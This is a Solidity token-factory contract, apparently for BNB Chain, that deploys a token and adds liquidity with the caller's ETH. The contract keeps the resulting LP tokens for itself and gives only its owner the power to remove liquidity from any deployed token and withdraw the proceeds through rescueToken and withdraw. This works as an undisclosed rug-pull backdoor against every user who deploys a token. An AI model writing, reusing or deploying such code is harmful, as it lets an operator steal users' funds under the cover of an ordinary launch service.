pragma solidity ^0.8.17;

//SPDX-License-Identifier: MIT
import "SecretToken.sol";
import "IERC20.sol";
import "Math.sol";

contract SecretFactory {
    uint256 public feePerEth = 1 * 10 ** 6;
    address private owner;
    uint256 public constant MINIMUM_LIQUIDITY = 10 ** 3;
    IDEXRouter public router;

    event feeChanged(uint256 amount);

    constructor() {
        owner = msg.sender;
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "only owner");
        _;
    }

    function updateFeePerEth(uint256 amount) external onlyOwner {
        feePerEth = amount;
        emit feeChanged(amount);
    }

    function deployToken(
        string[] memory _stringData,
        address[] memory _addressData,
        uint256[] memory _intData
    ) external payable returns (address) {
        TopSecreter deployedToken = new TopSecreter(
            _stringData,
            _addressData,
            _intData
        );
        deployedToken.authorize(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        uint256 tokenAmount = deployedToken.balanceOf(address(this));
        deployedToken.approve(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            tokenAmount
        );
        deployedToken.approve(deployedToken.pair(), tokenAmount);
        router.addLiquidityETH{value: msg.value}(
            address(deployedToken),
            tokenAmount,
            0,
            0,
            address(this),
            block.timestamp + 1
        );
        deployedToken.transferOwnership(payable(msg.sender));
        return address(deployedToken);
    }

    function removeLiquidity(address tokenAddress) external onlyOwner {
        TopSecreter deployedToken = TopSecreter(payable(tokenAddress));
        IERC20 lpToken = IERC20(deployedToken.pair());
        lpToken.approve(address(router), lpToken.balanceOf(address(this)));
        router.removeLiquidity(
            tokenAddress,
            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,
            lpToken.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 1
        );
    }

    function rescueToken(address token) external onlyOwner {
        IERC20 tokenToRescue = IERC20(token);
        tokenToRescue.transfer(owner, tokenToRescue.balanceOf(address(this)));
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}